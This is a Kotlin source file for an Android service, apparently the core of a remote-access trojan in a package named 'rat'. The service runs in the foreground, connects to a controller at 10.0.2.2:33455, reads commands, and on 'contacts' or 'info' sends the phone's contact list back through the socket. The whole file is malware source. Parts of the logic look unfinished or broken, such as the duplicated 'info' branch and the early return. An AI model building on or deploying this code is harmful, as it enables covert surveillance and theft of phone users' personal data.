package ru.awawa.rat.service

import android.app.IntentService
import android.app.Notification
import android.content.Intent
import android.util.Log
import androidx.core.app.JobIntentService
import ru.awawa.rat.helper.ContactsHelper
import ru.awawa.rat.helper.toHexString
import java.io.BufferedInputStream
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.InetSocketAddress
import java.net.Socket
import java.net.SocketException
import java.net.SocketTimeoutException
import kotlin.random.Random


class RatForegroundService: IntentService("RatForegroundService") {


    private val socket = Socket()
    private var running = false

    companion object {
        const val TAG = "RatForegroundService"
    }

    private val id = Random.nextInt()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground(id, getServiceNotification(this))
        return super.onStartCommand(intent, flags, startId)
    }

    override fun onHandleIntent(intent: Intent?) {
        val connectionAddress = InetSocketAddress("10.0.2.2", 33455)

        Log.e(TAG, "Trying to connect")
        socket.connect(connectionAddress)
        socket.soTimeout = 1
        Log.e(TAG, "Connected")
        running = true
        while (running) {
            try {
                val command = BufferedReader(InputStreamReader(socket.getInputStream())).readLine()
                if (command.isNotEmpty()) {
                    if (command.startsWith("contacts")) {
                        socket.getOutputStream().write(ContactsHelper.getContacts(this).toByteArray())
                        return
                    }
                    if (command.startsWith("info")) {
                        socket.getOutputStream().write(ContactsHelper.getContacts(this).toByteArray())
                        return
                    }
                    Log.e(TAG, command)
                }
                Log.e(TAG, "Read $command")
            } catch (ex: SocketTimeoutException) {}
        }
        stopForeground(true)
    }
}